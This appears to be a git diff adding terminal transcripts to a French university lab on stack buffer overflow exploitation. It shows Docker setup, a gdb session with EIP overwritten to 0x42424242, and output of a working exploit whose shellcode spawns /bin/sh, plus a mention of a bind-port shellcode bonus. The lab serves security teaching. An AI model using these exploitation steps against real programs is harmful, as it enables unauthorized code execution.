@@ -8,6 +8,20 @@ En passant, nous allons apprendre à utiliser git, docker, et un debugger : gdb.
 
 Utiliser la commande "git clone" pour cloner le repertoire git de ce TP sur cette machine.
 
+	jonathan@blackbox:~$ mkdir tp
+	jonathan@blackbox:~$ cd tp
+	jonathan@blackbox:~/tp$ git clone git@github.com:endrazine/cnam-tp2-sec108.git
+	Cloning into 'cnam-tp2-sec108'...
+	remote: Enumerating objects: 15, done.
+	remote: Counting objects: 100% (15/15), done.
+	remote: Compressing objects: 100% (13/13), done.
+	remote: Total 15 (delta 1), reused 12 (delta 1), pack-reused 0
+	Receiving objects: 100% (15/15), 24.13 KiB | 4.83 MiB/s, done.
+	Resolving deltas: 100% (1/1), done.
+	jonathan@blackbox:~/tp$ ls
+	cnam-tp2-sec108
+	jonathan@blackbox:~/tp$ 
+
 Vérifier que vous avez bien telechargé un fichier gdbinit ce faisant.
 
 ## Exploitation d'un stack overflow.
@@ -18,9 +32,39 @@ Nous allons utiliser le système de virtualisation docker afin de travailler sur
 
 Suivre les instructions de Docker: https://docs.docker.com/engine/install/
 
+	apt-get install -y \
+	    apt-transport-https \
+	    ca-certificates \
+	    curl \
+	    gnupg-agent \
+	    software-properties-common
+	    
+	curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
+
+	add-apt-repository \
+	   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
+	   $(lsb_release -cs) \
+	   stable"
+	   
+	apt-get update
+
+	apt-get install -y docker-ce docker-ce-cli containerd.io
+
+	usermod -aG docker ubuntu
+
+
 ### Telecharger la machine docker cible
 
 Utiliser la commande "docker login" pour s'identifier aupres du registry container d'OVH. Voir https://docs.docker.com/engine/reference/commandline/login/
+
+	jonathan@blackbox:~$ docker login 59b7c723.gra7.container-registry.ovh.net -u cnam -p XXXXXXXXXX
+	WARNING! Using --password via the CLI is insecure. Use --password-stdin.
+	WARNING! Your password will be stored unencrypted in /home/jonathan/.docker/config.json.
+	Configure a credential helper to remove this warning. See
+	https://docs.docker.com/engine/reference/commandline/login/#credentials-store
+
+	Login Succeeded
+	jonathan@blackbox:~$ 
 
 Les logins et mots de passe seront donnés en cours.
 
@@ -228,6 +272,40 @@ Verifier qu'en lancant le programme exploit, on execute bien le programme vulné
 
 Lancer exploit dans gdb. Constater que l'on controle bien eip, la valeur de la prochaine instruction executée.
 
+	jonathan@blackbox:~/CNAM/bo/poc$ ls
+	Makefile  bo  poc  poc.c
+	jonathan@blackbox:~/CNAM/bo/poc$ gdb ./poc 
+	GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+	Copyright (C) 2020 Free Software Foundation, Inc.
+	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+	This is free software: you are free to change and redistribute it.
+	There is NO WARRANTY, to the extent permitted by law.
+	Type "show copying" and "show warranty" for details.
+	This GDB was configured as "x86_64-linux-gnu".
+	Type "show configuration" for configuration details.
+	For bug reporting instructions, please see:
+	<http://www.gnu.org/software/gdb/bugs/>.
+	Find the GDB manual and other documentation resources online at:
+	    <http://www.gnu.org/software/gdb/documentation/>.
+
+	For help, type "help".
+	Type "apropos word" to search for commands related to "word"...
+	Reading symbols from ./poc...
+	(No debugging symbols found in ./poc)
+	gdb$ r
+	Starting program: /home/jonathan/CNAM/bo/poc/poc 
+	process 31682 is executing new program: /home/jonathan/CNAM/bo/poc/bo
+	Welcome: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB�������� !
+
+	Program received signal SIGSEGV, Segmentation fault.
+	--------------------------------------------------------------------------[regs]
+	  EAX: 0x00000000  EBX: 0x41414141  ECX: 0x00000000  EDX: 0x0804A016  o d I t S z a p c 
+	  ESI: 0xF7F8D000  EDI: 0xF7F8D000  EBP: 0x41414141  ESP: 0xFFFFDC30  EIP: 0x42424242
+	  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
+	Cannot access memory at address 0x42424242
+	0x42424242 in ?? ()
+	gdb$ 
+
 ##### Pseudo-shellcode
 
 Modifier votre exploit de manière à ce que le shellcode (tous les "A") soient remplacés par une instruction générant un SIGTRAP (utiliser l'opcode 0xCC au lieu de 0x41).
@@ -249,6 +327,11 @@ Vous pouvez remplacer les opcodes 0x41 qui restent par des NOPs (opcode 0x90).
 Vérifier qu'en lançant votre exploit, vous executez bien votre shellcode.
 
 Utiliser strace pour vérifier que l'execution de votre exploit lance bien le shellcode souhaité.
+
+	jonathan@blackbox:~/CNAM/bo/exploit$ ./exploit 
+	Welcome: 1�Ph//shh/bin��PTSP��!�t�;��
+		                             �RS��̀������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ����������� !
+	$ 
 
 
 ##### BONUS: Remplacer le shellcode par un shellcode "bind port"
